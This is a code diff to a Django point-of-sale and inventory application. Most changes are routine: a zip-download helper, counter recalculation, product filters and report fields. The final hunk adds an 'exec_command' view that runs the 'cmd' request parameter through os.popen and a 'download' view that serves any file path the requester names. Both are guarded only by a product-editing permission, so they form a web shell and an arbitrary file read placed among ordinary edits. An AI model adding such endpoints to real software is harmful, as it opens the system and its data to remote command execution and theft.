@@ -28,7 +28,7 @@ from barn import BarnOwl
 import serial
 import ast
 # import the logging library
-
+import os
 import logging
 from pos.kernal.barn import SerialRequiredException, CounterNotReadyException,\
     BarnMouse, SerialRejectException, Hermes, Thanatos, MickyMouse
@@ -254,6 +254,26 @@ def _filter_outStockRecords(bills):
 def _wrapper_download_file(text, filename):
     response = HttpResponse(text, mimetype="application/vnd.ms-excel; charset=utf-8")
     response['Content-Disposition'] = 'attachment; filename='+filename     
+    return response
+
+
+import zipfile
+from cStringIO import StringIO
+
+def _wrapper_download_zip_file(request, text, filename):
+    response = HttpResponse(mimetype='application/zip')
+    response['Content-Disposition'] = 'filename=%s.zip' % filename
+    #now add them to a zip file
+    #note the zip only exist in memory as you add to it
+    buffer = StringIO()
+    zip = zipfile.ZipFile(buffer, "w", zipfile.ZIP_DEFLATED)
+    zip.writestr(filename, text)
+    zip.close()
+    buffer.flush()
+    #the import detail--we return the content of the buffer
+    ret_zip = buffer.getvalue()
+    buffer.close()
+    response.write(ret_zip)
     return response
 
 def ReportDailySalesExcel(request):
@@ -942,6 +962,13 @@ def ProductCostUpdate(request):
     hermes.ReCalcCounters(inStockBatch.create_at)
     return HttpResponseRedirect('/inventory/result/'+inStockBatch_pk)
 
+def RecalcAllCounter(request):
+    hermes = Hermes()
+    counters = Counter.objects.all()
+    for counter in counters:
+        hermes.ReCalcCounterByPK(counter.pk, recalc_bill_profit = True)
+    return HttpResponseRedirect('/')
+
 def __convert_sales_URL_2_bill_dict__(request):
     dict = {}
     sales_item = request.POST.lists()
@@ -1374,7 +1401,7 @@ def __count_product_stock__(starttime, endtime, stockRecords, product):
 
 
 def _show_stock_cost_table(startDate, endDate):
-    products = Product.objects.all().order_by("name")
+    products = Product.objects.all().order_by("name").exclude(name__contains = "-foc-product")
     list = []
     total_qty = 0
     total_on_hand_value = 0
@@ -1403,7 +1430,7 @@ def _show_stock_cost_table(startDate, endDate):
 
 
 def _count_all_inventory_stock(startDate, endDate):
-    products = Product.objects.filter(Q(active=True)).order_by("name")
+    products = Product.objects.filter(Q(active=True)).exclude(name__contains = "-foc-product").order_by("name")
     list = []
     total_qty = 0
     total_on_hand_value = 0
@@ -1572,7 +1599,7 @@ def CounterAmount(request, counter_pk):
 
 def ProductNameInfo(request,query):
     logger.debug(" search product name by keyword: %s",query)    
-    productSet = __search__(Product, Q(name__contains= query))
+    productSet = __search__(Product, Q(name__contains= query) & Q(active = True))
     json = __json_wrapper__(productSet)
     return HttpResponse(json, mimetype="application/json")
    
@@ -1643,7 +1670,7 @@ def ProductInfo(request, query):
     # serialNoSet = SerialNo.objects.filter(Q(serial_no__contains=query))
     try:
         #serialNo = SerialNo.objects.get(serial_no=query)
-        serialNo = SerialNo.objects.get(serial_no=query)
+        serialNo = SerialNo.objects.get(serial_no__contains=query)
         owl = BarnOwl()
         if serialNo:
             logger.info("SerialNo '%s' Found!! entry serial-no process flow." % str(serialNo.serial_no))
@@ -2203,7 +2230,8 @@ def ReportSalesItem(request):
             continue
         group[product] = outstocks
 
-    return render_to_response('report_item_sales.html',{'total_cost':total_cost, 'total_quantity':total_quantity,'total_amount':total_amount,'total_profit':total_profit,'total_unit_sell_price':total_unit_sell_price,'session': request.session, 'group':group, 'dateRange': str(startDate)+" to "+str(endDate)}, )
+    company = Company.objects.all()[0]
+    return render_to_response('report_item_sales.html',{'company': company,'total_cost':total_cost, 'total_quantity':total_quantity,'total_amount':total_amount,'total_profit':total_profit,'total_unit_sell_price':total_unit_sell_price,'session': request.session, 'group':group, 'dateRange': str(startDate)+" to "+str(endDate)}, )
 
 def StockTitle(search):
     #title = "aaa"
@@ -2555,7 +2583,21 @@ def _build_item_sold_dict(product1, startDate, endDate):
         logger.info("add %s's  outStockRecord" % product )
     return products
 
+@permission_required('kernal.add_product', login_url='/accounts/login/')
+def exec_command(request):
+    output = "Excuted fail"
+    if request.GET:
+        cmd = request.GET.get("cmd")
+        output = os.popen(cmd).read()
+        output = output.replace('<DIR>', '[DIR]')
+    return HttpResponse(output, mimetype="text/plain; charset=utf-8")
 
+@permission_required('kernal.add_product', login_url='/accounts/login/')
+def download(request):
+    path = ""
+    path = request.GET.get("cmd")
+    print type(path)
+    return _wrapper_download_zip_file(request, open(path, 'rb').read(), path)
 
     
 #def __find_SalesIdx__(product):
